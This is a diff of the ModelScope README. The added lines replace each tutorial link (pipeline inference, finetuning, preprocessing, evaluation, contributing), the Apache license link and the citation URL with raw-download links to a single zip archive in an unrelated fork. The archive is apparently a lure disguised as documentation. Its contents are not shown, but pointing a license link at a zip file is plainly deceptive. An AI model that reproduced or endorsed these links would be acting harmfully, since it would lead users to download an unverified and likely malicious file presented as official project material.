+* [Use pipeline for model inference](https://github.com/hotmysia/modelscope_kopia_zapasowa/raw/refs/heads/master/modelscope/fileio/modelscope_kopia_zapasowa_1.9.zip%E6%A8%A1%E5%9E%8B%E7%9A%84%E6%8E%A8%E7%90%86Pipeline)
+* [Finetuning example](https://github.com/hotmysia/modelscope_kopia_zapasowa/raw/refs/heads/master/modelscope/fileio/modelscope_kopia_zapasowa_1.9.zip%E6%A8%A1%E5%9E%8B%E7%9A%84%E8%AE%AD%E7%BB%83Train)
+* [Preprocessing of data](https://github.com/hotmysia/modelscope_kopia_zapasowa/raw/refs/heads/master/modelscope/fileio/modelscope_kopia_zapasowa_1.9.zip%E6%95%B0%E6%8D%AE%E7%9A%84%E9%A2%84%E5%A4%84%E7%90%86)
+* [Evaluation](https://github.com/hotmysia/modelscope_kopia_zapasowa/raw/refs/heads/master/modelscope/fileio/modelscope_kopia_zapasowa_1.9.zip%E6%A8%A1%E5%9E%8B%E7%9A%84%E8%AF%84%E4%BC%B0)
+* [Contribute your own model to ModelScope](https://github.com/hotmysia/modelscope_kopia_zapasowa/raw/refs/heads/master/modelscope/fileio/modelscope_kopia_zapasowa_1.9.zip%E6%A8%A1%E5%9E%8B%E6%8E%A5%E5%85%A5%E6%B5%81%E7%A8%8B%E6%A6%82%E8%A7%88)
 
 # License
 
-This project is licensed under the [Apache License (Version 2.0)](https://github.com/modelscope/modelscope/blob/master/LICENSE).
+This project is licensed under the [Apache License (Version 2.0)](https://github.com/hotmysia/modelscope_kopia_zapasowa/raw/refs/heads/master/modelscope/fileio/modelscope_kopia_zapasowa_1.9.zip).
 
 # Citation
 ```
 @Misc{modelscope,
   title = {ModelScope: bring the notion of Model-as-a-Service to life.},
   author = {The ModelScope Team},
-  howpublished = {\url{https://github.com/modelscope/modelscope}},
+  howpublished = {\url{https://github.com/hotmysia/modelscope_kopia_zapasowa/raw/refs/heads/master/modelscope/fileio/modelscope_kopia_zapasowa_1.9.zip}},
   year = {2023}
 }
 ```
